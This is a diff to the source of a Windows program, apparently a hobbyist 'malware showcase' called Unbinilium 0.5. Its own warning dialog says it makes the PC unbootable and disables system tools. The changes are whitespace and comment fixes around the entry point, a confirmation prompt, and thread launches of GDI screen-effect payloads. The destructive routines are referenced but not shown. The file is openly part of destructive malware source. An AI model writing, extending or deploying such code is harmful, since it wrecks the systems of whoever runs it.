@@ -4,7 +4,7 @@ typedef struct IUnknown IUnknown;
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdParam, int nCmdShow)
 {
-    if (MessageBoxW(NULL,
+                if (MessageBoxW(NULL,
 		L"WARNING!\r\nThis software is known as malware.\r\nIt will make your PC unbootable and disable system tools.\r\nTo prevent this from happening, press 'No' and delete this file ASAP!\r\nThe creator VenraTech is not responsible for any actions done by this software.\n\nDo you proceed with running?\r\nAuthor's channel: https://www.youtube.com/@venra_malwares",
 		L"Unbinilium 0.5.exe",
 		MB_ICONWARNING | MB_YESNO) != IDYES) exit(0);
@@ -78,7 +78,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdPa
 		
 		MessageBoxA(NULL, "Click OK to start new payloads.", "Unbinilium 0.5.exe - Final Battle.", MB_ICONERROR); // Woah
 		
-		Sleep(1000 * 2); //2 Seconds\
+		Sleep(1000 * 2); //2 Seconds
 		
 		//MOUSE CLONER, ROTOZOOMER + TRIANGLE
 		HANDLE hPayload4 = CreateThread(NULL, NULL, GDIPayloads::Rotozoomer, NULL, NULL, NULL);
@@ -97,5 +97,5 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdPa
 		InvalidateRect(0, 0, 0);
 		
 		// End
-	  GDIPayloads::End();
+	        GDIPayloads::End();
 }
